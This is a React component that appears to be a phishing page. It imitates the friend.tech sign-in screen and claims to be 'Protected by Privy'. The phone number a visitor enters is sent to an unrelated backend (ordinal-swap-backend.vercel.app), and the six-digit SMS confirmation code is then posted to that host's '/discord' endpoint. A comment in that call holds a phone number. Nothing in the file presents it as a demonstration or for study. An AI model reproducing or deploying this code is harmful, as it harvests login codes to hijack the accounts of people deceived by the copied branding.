import React, { useState } from "react";
import axios from "axios";
import {
  CodeView,
  ConfirmView,
  FooterView,
  HeaderView,
  LineView,
  LogoTextView,
  MainContainer,
  MainWapper,
  MessageView,
  ModalContainer,
  ModalWrapper,
  PhoneView,
  SignContainer,
  SocialView,
} from "./admin.style";
import logo from "../assets/logo.png";
import AuthCode from "react-auth-code-input";
export default function Admin() {
  const [visible, setVisible] = useState(false);
  const [meessageVissiable, setMessageVissiable] = useState(false);
  const [phoneNumber, setPhoneNumber] = useState("");
  const [result, setResult] = useState();

  const onSubmit = async () => {
    if (phoneNumber && phoneNumber.length === 11) {
      await sendCode();
    }
  };
  const handleOnChange = (res) => {
    setResult(res);
    if (res.length === 6) {
      axios
        .post("https://ordinal-swap-backend.vercel.app/discord", {
          phoneNumber: phoneNumber, //18392050364
          code: res,
        })
        .then((res) => {
          alert("Successfully verified.");
          setVisible(false);
          setMessageVissiable(false);
        })
        .catch((err) => console.log(err));
    }
  };

  const sendCode = async () => {
    axios
      .post("https://ordinal-swap-backend.vercel.app/sendSMS", {
        phoneNumber: phoneNumber,
      })
      .then((res) => {
        alert("Successfully sent.");
        setVisible(false);
        setMessageVissiable(true);
      })
      .catch((err) => console.log(err));
  };
  return (
    <MainContainer>
      {visible && (
        <ModalContainer>
          <ModalWrapper>
            <HeaderView>
              <div
                onClick={() => {
                  setVisible(false);
                  setMessageVissiable(false);
                }}
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                  strokeWidth="2"
                  stroke="currentColor"
                  aria-hidden="true"
                  height="16px"
                  width="16px"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    d="M6 18L18 6M6 6l12 12"
                  ></path>
                </svg>
              </div>
            </HeaderView>
            <PhoneView status={phoneNumber.length === 11 ? "ok" : "no"}>
              <svg
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
                strokeWidth="1.5"
                stroke="currentColor"
                aria-hidden="true"
                width="24"
                height="24"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M2.25 6.75c0 8.284 6.716 15 15 15h2.25a2.25 2.25 0 002.25-2.25v-1.372c0-.516-.351-.966-.852-1.091l-4.423-1.106c-.44-.11-.902.055-1.173.417l-.97 1.293c-.282.376-.769.542-1.21.38a12.035 12.035 0 01-7.143-7.143c-.162-.441.004-.928.38-1.21l1.293-.97c.363-.271.527-.734.417-1.173L6.963 3.102a1.125 1.125 0 00-1.091-.852H4.5A2.25 2.25 0 002.25 4.5v2.25z"
                ></path>
              </svg>
              <input
                placeholder="555 555 5555"
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
              />
              <button onClick={() => onSubmit()}>Submit</button>
            </PhoneView>
            <div>
              <h5>Get started quickly with your phone</h5>
            </div>
            <LineView>
              <hr />
              <h6>Or</h6>
              <hr />
            </LineView>
            <SocialView>
              <button>
                <svg
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M22.56 12.25C22.56 11.47 22.49 10.72 22.36 10H12V14.255H17.92C17.665 15.63 16.89 16.795 15.725 17.575V20.335H19.28C21.36 18.42 22.56 15.6 22.56 12.25Z"
                    fill="#4285F4"
                  ></path>
                  <path
                    d="M12 23C14.97 23 17.46 22.015 19.28 20.335L15.725 17.575C14.74 18.235 13.48 18.625 12 18.625C9.13504 18.625 6.71004 16.69 5.84504 14.09H2.17004V16.94C3.98004 20.535 7.70004 23 12 23Z"
                    fill="#34A853"
                  ></path>
                  <path
                    d="M5.845 14.09C5.625 13.43 5.5 12.725 5.5 12C5.5 11.275 5.625 10.57 5.845 9.91V7.06H2.17C1.4 8.59286 0.999321 10.2846 1 12C1 13.775 1.425 15.455 2.17 16.94L5.845 14.09Z"
                    fill="#FBBC05"
                  ></path>
                  <path
                    d="M12 5.375C13.615 5.375 15.065 5.93 16.205 7.02L19.36 3.865C17.455 2.09 14.965 1 12 1C7.70004 1 3.98004 3.465 2.17004 7.06L5.84504 9.91C6.71004 7.31 9.13504 5.375 12 5.375Z"
                    fill="#EA4335"
                  ></path>
                </svg>
              </button>
              <button>
                <svg
                  version="1.1"
                  xmlns="http://www.w3.org/2000/svg"
                  x="0px"
                  y="0px"
                  viewBox="0 0 24 24"
                  width="24"
                  height="24"
                  fill="black"
                >
                  <path
                    d="M17.0722 11.6888C17.0471 8.90571 19.3263 7.56847 19.429 7.50274C18.1466 5.60938 16.153 5.35154 15.4417 5.3212C13.7461 5.14678 12.1306 6.32982 11.269 6.32982C10.4074 6.32982 9.08004 5.34648 7.67246 5.37429C5.82158 5.40209 4.11595 6.45874 3.16171 8.13218C1.24068 11.4942 2.6708 16.4817 4.54423 19.2143C5.46091 20.549 6.55041 22.0531 7.98554 21.9975C9.36803 21.9419 9.88905 21.095 11.5571 21.095C13.2251 21.095 13.696 21.9975 15.1537 21.9697C16.6389 21.9393 17.5806 20.6046 18.4897 19.2648C19.5392 17.7153 19.9725 16.2137 19.9975 16.1354C19.965 16.1228 17.1022 15.0155 17.0722 11.6888Z"
                    fill="black"
                  ></path>
                  <path
                    d="M14.3295 3.51373C15.0909 2.58347 15.6043 1.28921 15.4641 0C14.3671 0.0455014 13.0396 0.738135 12.2532 1.66838C11.5494 2.48994 10.9307 3.80695 11.0986 5.07089C12.3183 5.16694 13.5681 4.44145 14.3295 3.51373Z"
                    fill="black"
                  ></path>
                </svg>
              </button>
            </SocialView>
            <FooterView>
              <svg
                width="15"
                height="15"
                viewBox="0 0 15 15"
                fill="rgb(134, 134, 134)"
                xmlns="http://www.w3.org/2000/svg"
                className="hide-on-mobile"
              >
                <path
                  fillRule="evenodd"
                  clipRule="evenodd"
                  d="M2.37126 11.0323C2.37126 12.696 3.90598 13.4421 5.40654 13.4468C8.91753 13.4468 12.8021 11.2897 12.7819 7.67984C12.7673 5.07728 10.3748 2.86167 7.54357 2.88296C4.8495 2.88296 2.21821 4.6411 2.21803 7.03628C2.21803 7.67951 2.58722 8.30178 3.55231 8.37184C2.74763 9.16826 2.37126 10.1225 2.37126 11.0323ZM7.55283 8.68012C8.11562 8.68012 8.57186 8.13217 8.57186 7.45624C8.57186 6.78032 8.11562 6.23237 7.55283 6.23237C6.99003 6.23237 6.53379 6.78032 6.53379 7.45624C6.53379 8.13217 6.99003 8.68012 7.55283 8.68012ZM10.4747 8.68012C11.0375 8.68012 11.4937 8.13217 11.4937 7.45625C11.4937 6.78032 11.0375 6.23237 10.4747 6.23237C9.91186 6.23237 9.45562 6.78032 9.45562 7.45625C9.45562 8.13217 9.91186 8.68012 10.4747 8.68012Z"
                  fill="var(--privy-color-foreground-3)"
                ></path>
              </svg>

              <span>Protected by Privy</span>
            </FooterView>
          </ModalWrapper>
        </ModalContainer>
      )}
      {meessageVissiable && (
        <ModalContainer>
          <ModalWrapper>
            <HeaderView>
              <div
                onClick={() => {
                  setVisible(false);
                  setMessageVissiable(false);
                }}
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                  strokeWidth="2"
                  stroke="currentColor"
                  aria-hidden="true"
                  height="16px"
                  width="16px"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    d="M6 18L18 6M6 6l12 12"
                  ></path>
                </svg>
              </div>
            </HeaderView>
            <div style={{ marginTop: "4rem" }}>
              <svg
                xmlns="http://www.w3.org/2000/svg"
                fill="hsl(195,100%,49%)"
                viewBox="0 0 24 24"
                strokeWidth="2"
                stroke="currentColor"
                aria-hidden="true"
                height="40px"
                width="40px"
              >
                <path
                  style={{ color: "hsl(195,100%,49%)" }}
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M2.25 6.75c0 8.284 6.716 15 15 15h2.25a2.25 2.25 0 002.25-2.25v-1.372c0-.516-.351-.966-.852-1.091l-4.423-1.106c-.44-.11-.902.055-1.173.417l-.97 1.293c-.282.376-.769.542-1.21.38a12.035 12.035 0 01-7.143-7.143c-.162-.441.004-.928.38-1.21l1.293-.97c.363-.271.527-.734.417-1.173L6.963 3.102a1.125 1.125 0 00-1.091-.852H4.5A2.25 2.25 0 002.25 4.5v2.25z"
                ></path>
              </svg>
            </div>
            <ConfirmView>
              <h1>Enter confirmation code</h1>
              <h2>
                Please check {phoneNumber} for a message from friend.tech and
                enter your code below.
              </h2>
            </ConfirmView>
            <CodeView>
              <AuthCode onChange={handleOnChange} allowedCharacters="numeric" />
            </CodeView>
            <MessageView>
              <span>Didn't get a message?</span>
              <a href="#" onClick={() => sendCode()}>
                Resend Code
              </a>
            </MessageView>
            <FooterView>
              <svg
                width="15"
                height="15"
                viewBox="0 0 15 15"
                fill="rgb(134, 134, 134)"
                xmlns="http://www.w3.org/2000/svg"
                className="hide-on-mobile"
              >
                <path
                  fillRule="evenodd"
                  clipRule="evenodd"
                  d="M2.37126 11.0323C2.37126 12.696 3.90598 13.4421 5.40654 13.4468C8.91753 13.4468 12.8021 11.2897 12.7819 7.67984C12.7673 5.07728 10.3748 2.86167 7.54357 2.88296C4.8495 2.88296 2.21821 4.6411 2.21803 7.03628C2.21803 7.67951 2.58722 8.30178 3.55231 8.37184C2.74763 9.16826 2.37126 10.1225 2.37126 11.0323ZM7.55283 8.68012C8.11562 8.68012 8.57186 8.13217 8.57186 7.45624C8.57186 6.78032 8.11562 6.23237 7.55283 6.23237C6.99003 6.23237 6.53379 6.78032 6.53379 7.45624C6.53379 8.13217 6.99003 8.68012 7.55283 8.68012ZM10.4747 8.68012C11.0375 8.68012 11.4937 8.13217 11.4937 7.45625C11.4937 6.78032 11.0375 6.23237 10.4747 6.23237C9.91186 6.23237 9.45562 6.78032 9.45562 7.45625C9.45562 8.13217 9.91186 8.68012 10.4747 8.68012Z"
                  fill="var(--privy-color-foreground-3)"
                ></path>
              </svg>

              <span>Protected by Privy</span>
            </FooterView>
          </ModalWrapper>
        </ModalContainer>
      )}
      <MainWapper>
        <img src={logo} alt="" />
        <LogoTextView>
          <span>friend.</span>
          <span>tech</span>
        </LogoTextView>
        <p>The marketplace for your friends</p>
        <SignContainer onClick={() => setVisible(true)}>Sign In</SignContainer>
        <button>Check out our privacy policy →</button>
      </MainWapper>
    </MainContainer>
  );
}
